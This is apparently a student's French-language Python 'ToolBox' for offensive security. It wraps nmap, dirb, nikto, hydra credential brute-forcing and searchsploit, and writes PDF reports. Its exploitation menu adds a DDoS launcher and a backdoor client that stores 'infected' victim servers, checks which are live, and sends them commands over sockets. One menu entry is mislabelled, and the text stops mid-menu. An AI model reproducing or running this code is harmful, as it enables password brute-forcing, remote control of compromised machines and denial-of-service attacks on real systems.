#Fichier actuel
import subprocess
import os
#Module pour la création du rapport
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph, PageBreak
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
import re
import requests
import hashlib
from datetime import datetime
import socket #mini prgm revers shell

# Fonction pour réinitialiser tout les fichiers qui contienent les résulta des test effectuers avant
def delete_txt_files(directory):
# Parcourir tous les fichiers dans le répertoire
    for filename in os.listdir(directory):
        if filename.endswith(".txt"):
            # Construire le chemin complet du fichier
            file_path = os.path.join(directory, filename)
            # Supprimer le fichier
            os.remove(file_path)
""" 
 _      _      ____  ____ 
/ \  /|/ \__/|/  _ \/  __\
| |\ ||| |\/||| / \||  \/|
| | \||| |  ||| |-|||  __/
\_/  \|\_/  \|\_/ \|\_/    
"""

#Nmap scan de port
def execute_nmap_port_scan(target, port_range):
    """
    Fonction pour exécuter la commande Nmap pour un scan de ports et enregistrer les résultats dans un fichier
    """
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_Scan_Port.txt")  # Chemin du fichier de sortie dans le dossier "Résulta"
    command = ["nmap", "-p", port_range, target]
    with open(output_file, "w") as file:
        subprocess.run(command, stdout=file)
    print("\nLe scan de ports a été effectué avec succès. Les résultats ont été enregistrés dans", output_file)

def execute_nmap_service_discovery(target):
    """
    Fonction pour exécuter la commande Nmap pour lister les services en cours d'exécution ou tous les services existants
    """
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_Découverte_Services.txt")  # Chemin du fichier de sortie dans le dossier "Résulta"
    command = ["nmap", "-sV", target]
    with open(output_file, "w") as file:
        subprocess.run(command, stdout=file)
    print("\nLa découverte des services en cours d'exécution a été effectuée avec succès. Les résultats ont été enregistrés dans", output_file)

#Dirb Recherche de répertoire/fichier cacher
def execute_dirb(target, port):
    """
    Fonction pour exécuter la commande Dirb pour la recherche de répertoires et de fichiers cachés
    """
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_Dirb.txt")
    dirb_list_path = os.path.join("liste", "dirb_list.txt")
    command = ["dirb", "http://{}:{}".format(target, port), dirb_list_path]
    with open(output_file, "w") as file:
        subprocess.run(command, stdout=file)
    print("\nLa commande Dirb a été exécutée avec succès. Les résultats ont été enregistrés dans", output_file)


#Nikto Scan de vulnérabilité web
def execute_nikto(target):
    """
    Fonction pour exécuter la commande Nikto pour scanner les vulnérabilités sur un serveur web
    """
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_Nikto.txt")  # Chemin du fichier de sortie dans le dossier "Résulta"
    command = ["nikto", "-h", target]
    with open(output_file, "w") as file:
        process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=file, stderr=subprocess.PIPE, text=True)
        process.communicate(input="n\n")  # Envoie 'n' pour répondre à la question d'entrée de Nikto
    print("\nLa commande Nikto a été exécutée avec succès. Les résultats ont été enregistrés dans", output_file)
    
    # Fonction pour effectuer un scan réseau des adresses IP disponibles

def network_scan():
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_Scan_Reseau.txt")
    local_ip = subprocess.check_output(['hostname', '-I']).decode('utf-8').split()[0]
    ip_range = local_ip.rsplit('.', 1)[0] + '.1-255'
    
    # Exécution de la commande Nmap pour scanner les ports, les IP et les services
    print("Exécution du scan réseau...")
    try:
        result = subprocess.run(['nmap', '-p-', '-A', ip_range], capture_output=True, text=True)
        with open(output_file, 'w') as file:
            file.write(result.stdout)
        print("\nLe scan de ports, IP et services a été effectué avec succès. Les résultats ont été enregistrés dans", output_file)
    except FileNotFoundError:
        print("\nNmap n'est pas installé sur votre système. Veuillez l'installer pour utiliser cette fonctionnalité.")



# _    ___  _ ____  ____  ____ 
# / \ /|\  \///  _ \/  __\/  _ \
# | |_|| \  / | | \||  \/|| / \|
# | | || / /  | |_/||    /| |-||
# \_/ \|/_/   \____/\_/\_\\_/ \|


# 1- Hydra usr/mdp inconnue 
# Fonction pour analyser la sécurité des mots de passe avec Hydra
def analyze_password_security(username_list, password_list, target, service):
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_Hydra_UsrMdp.txt")  # Chemin du fichier de sortie dans le dossier "Résulta"
    command = ["hydra", "-L", username_list, "-P", password_list, target, service]
    with open(output_file, "w") as file:
        subprocess.run(command, stdout=file)
    print("\nAnalyse de la sécurité des mots de passe effectuée avec succès. Les résultats ont été enregistrés dans", output_file)

# 2- Hydra usr connue mdp inconnue
# Fonction pour tester une liste de mots de passe pour un identifiant connu avec Hydra
def test_password_list_for_username(username, password_list, target, service):
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_Hydra_Identifiant.txt")  # Chemin du fichier de sortie dans le dossier "Résulta"
    command = ["hydra", "-l", username, "-P", password_list, target, service]
    with open(output_file, "w") as file:
        subprocess.run(command, stdout=file)
    print("\nTest de la liste de mots de passe pour l'identifiant {} effectué avec succès. Les résultats ont été enregistrés dans {}".format(username, output_file))

#3 - Hydra usr incconue mdp connue
# Fonction pour tester une liste d'identifiants pour un mot de passe connu avec Hydra
def test_username_list_for_password(username_list, password, target, service):
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_Hydra_Mdp.txt")  # Chemin du fichier de sortie dans le dossier "Résulta"
    command = ["hydra", "-L", username_list, "-p", password, target, service]
    with open(output_file, "w") as file:
        subprocess.run(command, stdout=file)
    print("\nTest de la liste d'identifiants pour le mot de passe {} effectué avec succès. Les résultats ont été enregistrés dans {}".format(password, output_file))

#4 - Hydra Connexion avec le usr/mdp
# Fonction pour tester l'authentification avec les identifiants récupérés auparavant avec Hydra
def test_authentication_with_credentials(target, service):
    username = input("Nom d'utilisateur : ")
    password = input("Mot de passe : ")
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_Hydra_Connexion.txt")  # Chemin du fichier de sortie dans le dossier "Résulta"
    command = ["hydra", "-l", username, "-p", password, target, service]
    with open(output_file, "w") as file:
        subprocess.run(command, stdout=file)
    print("\nTest d'authentification avec les identifiants fournis effectué avec succès. Les résultats ont été enregistrés dans {}".format(output_file))
                                                                                                                    
#5
# Vérification de la froce de votre mots de passe
def verifie_mdp_compromis(mot_de_passe):
    # Hasher le mot de passe en SHA1
    sha1_mot_de_passe = hashlib.sha1(mot_de_passe.encode('utf-8')).hexdigest().upper()
    # Diviser le hash en préfixe et suffixe
    prefixe, suffixe = sha1_mot_de_passe[:5], sha1_mot_de_passe[5:]
    
    # Envoi d'une requête à l'API HIBP pour vérifier si le suffixe du hash est compromis
    reponse = requests.get(f"https://api.pwnedpasswords.com/range/{prefixe}")
    if reponse.status_code == 200:
        # Si la réponse est réussie, récupérer la liste des hash correspondants au préfixe
        hash_liste = (ligne.split(':') for ligne in reponse.text.splitlines())
        # Parcourir la liste des hash pour vérifier si le suffixe est présent
        for h, compteur in hash_liste:
            if h == suffixe:
                # Si le suffixe est trouvé, le mot de passe est compromis
                return f"Le mot de passe a été trouvé {compteur} fois dans les fuites de données. Il est recommandé de ne pas l'utiliser."
        # Si le suffixe n'est pas trouvé, le mot de passe n'est pas compromis
        return "\nLe mot de passe n'a pas été trouvé dans les fuites de données."
    else:
        # En cas d'échec de la requête, indiquer qu'il est impossible de vérifier le mot de passe actuellement
        return "\nImpossible de vérifier le mot de passe actuellement."

# ____  _     _____
#/   _\/ \ |\/  __/
#|  /  | | //|  \  
#|  \__| \// |  /_ 
#\____/\__/  \____\

# Fonction pour rechercher des CVE en fonction du port
def search_cve_by_port(port_number):
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_CVE_Port.txt")  # Chemin du fichier de sortie dans le dossier "Resultat"
    command = ["searchsploit", "port", str(port_number)]  # Limite à 10 résultats
    with open(output_file, "w") as file:
        subprocess.run(command, stdout=file)

# Fonction pour rechercher des CVE en fonction du service
def search_cve_by_service(service_name):
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_CVE_Service.txt")  # Chemin du fichier de sortie dans le dossier "Resultat"
    command = ["searchsploit", service_name]  # Limite à 10 résultats
    with open(output_file, "w") as file:
        subprocess.run(command, stdout=file)

# Fonction pour rechercher des CVE en fonction du système d'exploitation
def search_cve_by_os(os_name):
    output_directory = "Resultat"
    output_file = os.path.join(output_directory, "Result_CVE_OS.txt")  # Chemin du fichier de sortie dans le dossier "Resultat"
    command = ["searchsploit", os_name]  # Limite à 10 résultats
    with open(output_file, "w") as file:
        subprocess.run(command, stdout=file)

# ________  _ ____  _     ____  _  _____ 
#/  __/\  \///  __\/ \   /  _ \/ \/__ __\
#|  \   \  / |  \/|| |   | / \|| |  / \  
#|  /_  /  \ |  __/| |_/\| \_/|| |  | |  
#\____\/__/\\\_/   \____/\____/\_/  \_/  
                                        
# Attaque DDoS
def launch_ddos_attack(target, duration):
    # Construction de la commande pour lancer l'attaque DDoS
    command = f"python ddos_script.py {target} {duration}"
    # Exécution de la commande dans un processus séparé
    os.system(command)
        
        
# Revers shell mini programme

# Chemin du dossier contenant le fichier serveurs_infectes.txt
directory = "liste"
# Chemin complet du fichier
file_path = os.path.join(directory, "serveurs_infectes.txt")
servers = []

def add_server(ip, port):
    servers.append((ip, port))
    with open(file_path, "a") as f:
        f.write(f"{ip},{port}\n")

def load_servers():
    try:
        with open(file_path, "r") as f:
            for line in f:
                ip, port = line.strip().split(",")
                servers.append((ip, int(port)))
    except FileNotFoundError:
        # Si le fichier n'existe pas, il n'y a pas de serveurs à charger
        pass

def list_servers():
    active_servers = []
    for ip, port in servers:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.1)
                s.connect((ip, port))
                active_servers.append((ip, port))
        except:
            pass
    return active_servers

def execute_command(command, ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            s.send(command.encode())
            output = s.recv(4096).decode()
            return output
    except Exception as e:
        return str(e)

    
# ____  ____  ____  ____  ____  ____  _____ 
#/  __\/  _ \/  __\/  __\/  _ \/  __\/__ __\
#|  \/|| / \||  \/||  \/|| / \||  \/|  / \  
#|    /| |-|||  __/|  __/| \_/||    /  | |  
#\_/\_\\_/ \|\_/   \_/   \____/\_/\_\  \_/  
                                                                        

# Fonction pour créer le PDF
# Fonction de création du rapport pdf
def create_pdf(scan_port_data, discovery_services_data, dirb_data, nikto_data, network_scan_data, hydra_usrmdp_data, hydra_identifiant_data, hydra_mdp_data, hydra_connexion_data, cve_port_data, cve_service_data, cve_os_data, output_pdf):
    # Création du document PDF avec le nom de fichier de sortie (et la taille de la page)
    doc = SimpleDocTemplate(output_pdf, pagesize=letter)
    styles = getSampleStyleSheet()

    # Variable qui contien le contenu du rapport
    content = []

    # Page de garde
    cover = [
        Paragraph(f"Rapport ToolBox du {datetime.now().strftime('%d/%m/%Y')}", styles['Title']),
        Paragraph("ToolBox réalisé par Valentin XXX", styles['Normal'])
    ]
    content.extend(cover)

    # Première page avec les 4 rapports
    content.append(PageBreak())  # Saut de page pour commencer sur une nouvelle page

    # Rapports Port scannés, Services découverts, DIRB et Nikto
    scan_port_table_data = [['Adresse IP', 'Port', 'Service']]
    scan_port_table_data.extend(scan_port_data)

    discovery_services_table_data = [['Adresse IP', 'Port', 'Service', 'Version']]
    discovery_services_table_data.extend(discovery_services_data)

    network_scan_table_data = [['Adresse IP', 'Port', 'Service']]
    network_scan_table_data.extend(network_scan_data)
    
    scan_port_table = Table(scan_port_table_data)
    discovery_services_table = Table(discovery_services_table_data)
    network_scan_table = Table(network_scan_table_data)
    
#Future erreur ???
    # Construction du tableau à deux colonnes
    table_data = []
    for i in range(0, len(dirb_data), 2):
        try:
            pair = [dirb_data[i], dirb_data[i+1]]
        except IndexError:
            pair = [dirb_data[i], ""]  # S'il n'y a pas d'URL à la position i+1
        table_data.append(pair)

    # Style des tableaux    
    table_style = TableStyle([('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                              ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                              ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                              ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                              ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                              ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                              ('GRID', (0, 0), (-1, -1), 1, colors.black)])

    # Appliquer le style aux du tableaux 
    scan_port_table.setStyle(table_style)
    discovery_services_table.setStyle(table_style)
    network_scan_table.setStyle(table_style)

    # Ajout des tableaux et des rapports DIRB et Nikto au contenu
    content.extend([
        Paragraph("Ports Scannés", styles['Title']), scan_port_table,
        Paragraph("Services Découverts", styles['Title']), discovery_services_table,
        Paragraph("Rapport DIRB", styles['Title']), Paragraph(dirb_data, styles['Normal']),
        Paragraph("Scan Réseau", styles['Title']), network_scan_table,
        Paragraph("Rapport Nikto", styles['Title']), Paragraph(nikto_data, styles['Normal'])
        
    ])

    # Troisième page avec les rapports Hydra
    content.append(PageBreak())  # Saut de page pour commencer sur une nouvelle page

# Ajout les rapports Hydra s'ils sont disponibles
    # Vérifie s'il y a au moins une donnée Hydra disponible
    if any([hydra_usrmdp_data, hydra_identifiant_data, hydra_mdp_data, hydra_connexion_data]):
        # Ajoute un titre "Rapports Hydra" au contenu du rapport
        content.extend([Paragraph("Rapports Hydra", styles['Title'])])
        # Vérifie s'il y a des données pour Hydra (UsrMdp)
        if hydra_usrmdp_data:
            content.extend([
                Paragraph("Hydra (UsrMdp) :", styles['Normal']), # Ajoute le titre "Hydra (UsrMdp)" suivi des données
                Paragraph("<br/><br/>", styles['Normal']),  # Saut de ligne après chaque section Hydra
                Paragraph(hydra_usrmdp_data, styles['Normal']), # Ajoute les données Hydra (UsrMdp)
                Paragraph("<br/><br/>", styles['Normal'])  # Saut de ligne après chaque section Hydra
            ])
        if hydra_identifiant_data:
            content.extend([
                Paragraph("Hydra (Identifiant) :", styles['Normal']),
                Paragraph("<br/><br/>", styles['Normal']),  # Saut de ligne après chaque section Hydra
                Paragraph(hydra_identifiant_data, styles['Normal']),
                Paragraph("<br/><br/>", styles['Normal'])  # Saut de ligne après chaque section Hydra
            ])
        if hydra_mdp_data:
            content.extend([
                Paragraph("Hydra (Mot de passe) :", styles['Normal']),
                Paragraph("<br/><br/>", styles['Normal']),  # Saut de ligne après chaque section Hydra
                Paragraph(hydra_mdp_data, styles['Normal']),
                Paragraph("<br/><br/>", styles['Normal'])  # Saut de ligne après chaque section Hydra
            ])
        if hydra_connexion_data:
            content.extend([
                Paragraph("Hydra (Connexion) :", styles['Normal']),
                Paragraph("<br/><br/>", styles['Normal']),  # Saut de ligne après chaque section Hydra
                Paragraph(hydra_connexion_data, styles['Normal']),
                Paragraph("<br/><br/>", styles['Normal'])  # Saut de ligne après chaque section Hydra
            ])
        # Vérification pour les données CVE-Port
        if cve_port_data:
            content.append(PageBreak())  # Saut de page pour commencer sur une nouvelle page
            content.extend([Paragraph("Rapport CVE-Port", styles['Title'])])
            smaller_text_style = ParagraphStyle(name='SmallerText', parent=styles['Normal'], fontSize=9)  # Définir la taille de police plus petite
            content.extend([Paragraph("Pour exploiter les CVE rendez-vous sur le site : https://www.cve.org/ ", smaller_text_style)])
            # Création du tableau pour les données CVE-Port
            cve_port_table_data = [['Exploit Title', 'Path']]
            cve_port_table_data.extend(cve_port_data)
            cve_port_table = Table(cve_port_table_data)
            cve_port_table.setStyle(table_style)
            content.append(cve_port_table)

        # Vérification pour les données CVE-Service
        if cve_service_data:
            content.append(PageBreak())  # Saut de page pour commencer sur une nouvelle page
            content.extend([Paragraph("Rapport CVE-Service", styles['Title'])])
            # Création du tableau pour les données CVE-Service
            cve_service_table_data = [['Exploit Title', 'Path']]
            cve_service_table_data.extend(cve_service_data)
            cve_service_table = Table(cve_service_table_data)
            cve_service_table.setStyle(table_style)
            content.append(cve_service_table)

        # Vérification pour les données CVE-OS
        if cve_os_data:
            content.append(PageBreak())  # Saut de page pour commencer sur une nouvelle page
            content.extend([Paragraph("Rapport CVE-OS", styles['Title'])])
            # Création du tableau pour les données CVE-OS
            cve_os_table_data = [['Exploit Title', 'Path']]
            cve_os_table_data.extend(cve_os_data)
            cve_os_table = Table(cve_os_table_data)
            cve_os_table.setStyle(table_style)
            content.append(cve_os_table)

    doc.build(content)

# Fonction pour extraire le contenu des fichiers 
def extract_file_content(file_name):
    try:
        with open(file_name, 'r') as file:
            return file.read()
    except FileNotFoundError: #Gestion d'erreur
        return "" # Retourner une chaîne vide si le fichier n'est pas trouvé

# Fonction pour extraire les données du rapport de scan de port
def extract_data_scan_port(file_name):
    try:
        data = []
        with open(file_name, 'r') as file:
            report_match = re.search(r"Nmap scan report for (.+)", file.read())
            if report_match:
                ip_address = report_match.group(1)
                file.seek(0)
                for line in file:
                    port_match = re.search(r"(\d+)/tcp\s+open\s+(\S+)", line)
                    if port_match:
                        port_number = port_match.group(1)
                        service = port_match.group(2)
                        data.append((ip_address, port_number, service))
        return data
    except FileNotFoundError:
        print(f"Le fichier {file_name} est introuvable. Les données de scan de port seront manquantes.")
        return []

#Fonction pour extraire les données du rapport de découverte de services
def extract_data_discovery_services(file_name):
    try:
        data = []
        with open(file_name, 'r') as file:
            report_match = re.search(r"Nmap scan report for (.+)", file.read())
            if report_match:
                ip_address = report_match.group(1)
                file.seek(0)
                for line in file:
                    service_match = re.search(r"(\d+)/tcp\s+open\s+(\S+)\s+(.*)", line)
                    if service_match:
                        port_number = service_match.group(1)
                        service = service_match.group(2)
                        version = service_match.group(3)
                        data.append((ip_address, port_number, service, version))
        return data
    except FileNotFoundError:
        print(f"Le fichier {file_name} est introuvable. Les données de découverte de services seront manquantes.")
        return []

# Fonction pour extraire les données du rapport DIRB
def extract_data_dirb(file_name):
    return extract_file_content(file_name)  # Appeler la fonction pour extraire le contenu du fichier
# Fonction pour extraire les données du rapport Nikto
def extract_data_nikto(file_name):
    return extract_file_content(file_name)

# Fonction pour extraire les données du rapport Hydra (UsrMdp)
def extract_data_hydra_usrmdp(file_name):
    try:
        with open(file_name, 'r') as file:
            content = file.read()
            # Utiliser des expressions régulières pour extraire les informations nécessaires
            host_match = re.search(r"\[DATA\] attacking (.+)", content)
            login_match = re.search(r"login: (.+)", content)
            password_match = re.search(r"password: (.+)", content)
            if host_match and login_match and password_match:
                host = host_match.group(1)
                login = login_match.group(1)
                password = password_match.group(1)
                return f"Host: {host}\nLogin: {login}\n"
            else:
                return "Aucune donnée disponible pour le rapport Hydra (UsrMdp)"
    except FileNotFoundError:
        return "Le fichier spécifié est introuvable."

# Fonction pour extraire les données du rapport Hydra (Mot de passe)
def extract_data_hydra_mdp(file_name):
    try:
        with open(file_name, 'r') as file:
            content = file.read()
            password_match = re.search(r"password: (.+)", content)
            login_match = re.search(r"login: (.+)", content)  # Ajout de la recherche du login
            if password_match:
                password = password_match.group(1)
                login = login_match.group(1) if login_match else "Non spécifié"  # Si le login n'est pas trouvé, spécifier "Non spécifié"
                return f"Login: {login}\n"  # Retourner le login et le mot de passe
            else:
                return "Aucune donnée disponible pour le rapport Hydra (Mot de passe)"
    except FileNotFoundError:
        return "Le fichier spécifié est introuvable."

# Fonction pour extraire les données du rapport Hydra (Identifiant)
def extract_data_hydra_identifiant(file_name):
    try:
        with open(file_name, 'r') as file:
            content = file.read()
            # Utiliser des expressions régulières pour extraire les informations nécessaires
            login_match = re.search(r"login: (.+)", content)
            if login_match:
                login = login_match.group(1)
                return f"Login: {login}"
            else:
                return "Aucune donnée disponible pour le rapport Hydra (Identifiant)"
    except FileNotFoundError:
        return "Le fichier spécifié est introuvable."
    
# Fonction pour extraire les données du rapport Hydra (Connexion)
def extract_data_hydra_connexion(file_name):
    try:
        with open(file_name, 'r') as file:
            lines = file.readlines()
            # Récupérer les 3 dernières lignes du fichier
            last_lines = lines[-3:]
            return ''.join(last_lines)
    except FileNotFoundError:
        return "Le fichier spécifié est introuvable."

# Fonction pour extraire les données du rapport CVE-Port
def extract_data_cve_port(file_name):
    try:
        data = []
        with open(file_name, 'r') as file:
            for _ in range(10):
                line = file.readline()
                if not line:
                    break
                # Utiliser une expression régulière pour extraire le titre de l'exploit et le chemin
                match = re.match(r"(.+)\|(.+)", line)
                if match:
                    exploit_title = match.group(1).strip()
                    path = match.group(2).strip()
                    data.append((exploit_title, path))
        return data
    except FileNotFoundError:
        return []

# Fonction pour extraire les données du rapport CVE-Service
def extract_data_cve_service(file_name):
    return extract_data_cve_port(file_name)
# Fonction pour extraire les données du rapport CVE-OS
def extract_data_cve_os(file_name):
    return extract_data_cve_port(file_name)

#  __  __          _____ _   _ 
# |  \/  |   /\   |_   _| \ | |
# | \  / |  /  \    | | |  \| |
# | |\/| | / /\ \   | | | . ` |
# | |  | |/ ____ \ _| |_| |\  |
# |_|  |_/_/    \_\_____|_| \_|


# Fonction principale pour recueillir les paramètres et exécuter les commandes
def main():
    
    print("""
          .-') _                                             .-. .-')              ) (`-.                 (`-.     ('-.                 ('-.       .-') _  .-') _               .-') _                      
     (  OO) )                                            \  ( OO )              ( OO ).             _(OO  )_  ( OO ).-.           _(  OO)     ( OO ) )(  OO) )             ( OO ) )                        
    /     '._  .-'),-----.  .-'),-----.  ,--.            ;-----.\  .-'),-----.(_/.  \_)-.      ,--(_/   ,. \ / . --. / ,--.     (,------.,--./ ,--,' /     '._ ,-.-') ,--./ ,--,'           ,----.        
    |'--...__)( OO'  .-.  '( OO'  .-.  ' |  |.-')        | .-.  | ( OO'  .-.  '\  `.'  /       \   \   /(__/ | \-.  \  |  |.-')  |  .---'|   \ |  |\ |'--...__)|  |OO)|   \ |  |\   .-')   '  .-./-')     
    '--.  .--'/   |  | |  |/   |  | |  | |  | OO )       | '-' /_)/   |  | |  | \     /\        \   \ /   /.-'-'  |  | |  | OO ) |  |    |    \|  | )'--.  .--'|  |  \|    \|  | )_(  OO)  |  |_( O- )    
       |  |   \_) |  |\|  |\_) |  |\|  | |  |`-' |       | .-. `. \_) |  |\|  |  \   \ |         \   '   /, \| |_.'  | |  |`-' |(|  '--. |  .     |/    |  |   |  |(_/|  .     |/(,------. |  | .--, \   
       |  |     \ |  | |  |  \ |  | |  |(|  '---.'       | |  \  |  \ |  | |  | .'    \_)         \     /__) |  .-.  |(|  '---.' |  .--' |  |\    |     |  |  ,|  |_.'|  |\    |  '------'(|  | '. (_/    
       |  |      `'  '-'  '   `'  '-'  ' |      |        | '--'  /   `'  '-'  '/  .'.  \           \   /     |  | |  | |      |  |  `---.|  | \   |     |  | (_|  |   |  | \   |           |  '--'  |     
       `--'        `-----'      `-----'  `------'        `------'      `-----''--'   '--'           `-'      `--' `--' `------'  `------'`--'  `--'     `--'   `--'   `--'  `--'            `------'    
    """)
    
    # Détermine le chemin du répertoire actuel
    current_directory = os.path.dirname(os.path.abspath(__file__))
    
    result_directory = "Resultat" #Définie le repertoir ou ce situe les fichiers à supprimer
    delete_txt_files(result_directory) # Appel la fonction qui supprime tous les fichiers .txt du repertoire "Resultatt"
    
    
    while True:
        # Affichage du menu pour choisir l'outil à exécuter
        print("\nVeuillez choisir l'outil à exécuter :")
        print("1. Découverte de port et de services et de leurs vulnérabilités")
        print("2. Analyse de la sécurité des mots de passe, Test d'authentification - Hydra")
        print("3. Recherche de vulnérabilités - CVE")
        print("4. Exploitation de vulnérabilités -XXXXXXXXXXXXXX")
        print("5. Générez un rapport des tests effectués")
        print("6. Quitter")
        choix_outil = input("Votre choix (1 - 6) : ")

#1
        if choix_outil == "1":
             
                # Code pour Nmap
                print("\nVeuillez choisir l'option Nmap à exécuter :")
                print("1. Le scan de ports - Nmap")
                print("2. La découverte des services en cours d'exécution - Nmap")
                print("3. Recherche de répertoires/fichiers cachés sur un serveur web - dirb")
                print("4. Scan de vulnérabilité sur un serveur web - Nikto")
                print("5. Scan réseau des adresses IP disponibles")
                print("6. Retour au choix de l'outil")
                choix_nmap = input("Votre choix (1 à 6) : ")
                #Nmap - Scan port
                if choix_nmap == "1":
                    target = input("Adresse IP de la cible : ")
                    port_range = input("Plage de ports à scanner (par exemple, 1-1000) : ")
                    execute_nmap_port_scan(target, port_range)
                elif choix_nmap == "2":
                    target = input("Adresse IP de la cible : ")
                    execute_nmap_service_discovery(target)
                #Dirb
                elif choix_nmap == "3":
                    print("\nExécution de l'outil Dirb :")
                    target = input("Adresse IP de la cible : ")
                    port = input("Numéro de port : ")
                    execute_dirb(target, port)            
                #Nikto
                elif choix_nmap == "4":
                    print("\nExécution de l'outil Nikto :")
                    target = input("Adresse IP de la cible : ")
                    execute_nikto(target)
                
                elif choix_nmap == "5":
                    network_scan()        
                    

                elif choix_nmap == "6":
                    break  # Sortir du sous-menu et revenir au menu principal
                else:
                    print("Choix invalide. Veuillez saisir 1, 2, 3, 4, 5 ou 6.")
                
#2      
        elif choix_outil == "2":
            while True:
                # Code pour Hydra
                print("\nVeuillez choisir l'option Hydra à exécuter :")
                print("1. Analyse de la sécurité des mots de passe")
                print("2. Tester une liste de mdp pour 1 identifient connue")
                print("3. Tester une liste d identifient pour un mdp connue")
                print("4. Test d authentification avec les identifiants récupérer avant")
                print("5. Tester si votre mots de passe est compromis")
                print("6. Retour au choix de l'outil")
                choix_hydra = input("Votre choix (1 à 6) : ")
                
                if choix_hydra == "1":
                    # Code pour l'option 1 : Analyse de la sécurité des mots de passe
                    username_list = os.path.join(current_directory, "liste", "names_list.txt")
                    password_list = os.path.join(current_directory, "liste", "password_list.txt")
                    target = input("Adresse IP de la cible : ")
                    service = input("Service cible (par exemple, ssh, http, etc.) : ")
                    analyze_password_security(username_list, password_list, target, service)
                
                elif choix_hydra == "2":
                    # Code pour l'option 2 : Tester une liste de mots de passe pour un identifiant connu
                    username = input("Nom d'utilisateur cible : ")
                    password_list = os.path.join(current_directory, "liste", "password_list.txt")
                    target = input("Adresse IP de la cible : ")
                    service = input("Service cible (par exemple, ssh, http, etc.) : ")
                    test_password_list_for_username(username, password_list, target, service)

                elif choix_hydra == "3":
                    # Code pour l'option 3 : Tester une liste d'identifiants pour un mot de passe connu
                    username_list = os.path.join(current_directory, "liste", "names_list.txt")
                    password = input("Mot de passe cible : ")
                    target = input("Adresse IP de la cible : ")
                    service = input("Service cible (par exemple, ssh, http, etc.) : ")
                    test_username_list_for_password(username_list, password, target, service)

                elif choix_hydra == "4":
                    # Code pour l'option 4 : Test d'authentification avec les identifiants récupérés avant
                        target = input("Adresse IP de la cible : ")
                        service = input("Service cible (par exemple, ssh, http, etc.) : ")
                        test_authentication_with_credentials(target, service)
                
                elif choix_hydra == "5":
                    # Demander à l'utilisateur de saisir son mot de passe
                    mot_de_passe = input("Veuillez entrer votre mot de passe à vérifier : ")
                    # Appeler la fonction pour vérifier si le mot de passe est compromis
                    resultat = verifie_mdp_compromis(mot_de_passe)
                    # Afficher le résultat de la vérification
                    print(resultat)
                
                elif choix_hydra == "6":
                    break  # Sortir du sous-menu et revenir au menu principal

                else:
                    print("Choix invalide. Veuillez saisir 1, 2, 3, 4 , 5 ou 6.")
                
#3
#CVE des ports commandes fonctionnel mais Resultat non pertinant
        elif choix_outil == "3":
            while True:
                # Code pour la recherche de CVE
                print("\nVeuillez choisir l'option CVE à exécuter :")
                print("1. Port - CVE")
                print("2. Service - CVE")
                print("3. Systhème d'exploitation - CVE")
                print("4. Retour au choix de l'outil")
                choix_CVE = input("Votre choix (1 à 4.) : ")
            
                if choix_CVE == "1":
                    port_number = input("Entrez le numéro de port (80, 22, 443, etc..) : ")
                    search_cve_by_port(port_number)

                elif choix_CVE == "2":
                    service_name = input("Entrez le nom du service ssh, http, ftp, etc..) : ")
                    output_file = "Result_CVE_Service.txt"
                    search_cve_by_service(service_name)

                elif choix_CVE == "3":
                    os_name = input("Entrez le nom du système d'exploitation (Windows, Linux, MacOS, etc..) : ")
                    output_file = "Result_CVE_OS.txt"
                    search_cve_by_os(os_name)
                    
                elif choix_CVE == "4":
                    break  # Sortir du sous-menu et revenir au menu principal

                else:
                    print("Choix invalide. Veuillez saisir 1, 2, 3 à 4.")



#4
        elif choix_outil == "4":
            while True:
                # Code pour l'exploitation de vulnérabilités
                print("\nVeuillez choisir l'option d'exploitation de vulnérabilités :")
                print("1. Connexion - ssh")
                print("2. Connexion au back d'or - Reverse Shell") 
                print("3. DDoS - LOIC")
                print("4. Retour au choix de l'outil")
                choix_exploit = input("Votre choix (1 à 5.) : ")

                # affichage des exploit existant
                if choix_exploit == "1":
                    target = input("Entrez l'adresse IP de la cible : ")
                    duration = input("Entrez la durée de l'attaque (en secondes) : ")
                    # Appel de la fonction pour lancer l'attaque DDoS
                    launch_ddos_attack(target, duration)

    
                elif choix_exploit == "2":
                    load_servers()
                    while True:
                        print("\nMenu d'options:")
                        print("1. Ajouter un serveur victime")
                        print("2. Afficher les serveurs enregistrés et actifs")
                        print("3. Se connecter à un serveur et exécuter une commande")
                        print("4. Quitter le programme")

                        choice = input("Entrez le numéro de l'option choisie : ")

                        if choice == "1":
                            ip = input("Entrez l'adresse IP du serveur : ")
                            port = input("Entrez le port d'écoute du serveur : ")
                            if not port.isdigit():
                                print("Le port doit être un nombre entier.")
                                continue
                            add_server(ip, int(port))
                            print("\nServeur ajouté avec succès.")
                        elif choice == "2":
                            active_servers = list_servers()
                            print("\nListe des serveurs enregistrés et actifs :")
                            if not active_servers:
                                print("\nAucun serveur enregistré ou actif.")
                            else:
                                for i, (ip, port) in enumerate(active_servers, 1):
                                    print(f"{i}. IP: {ip}, Port: {port}")
                        elif choice == "3":
                            active_servers = list_servers()
                            if not active_servers:
                                print("\nAucun serveur enregistré ou actif.")
                                continue
                            print("\nListe des serveurs enregistrés et actifs :")
                            for i, (ip, port) in enumerate(active_servers, 1):
                                print(f"{i}. IP: {ip}, Port: {port}")
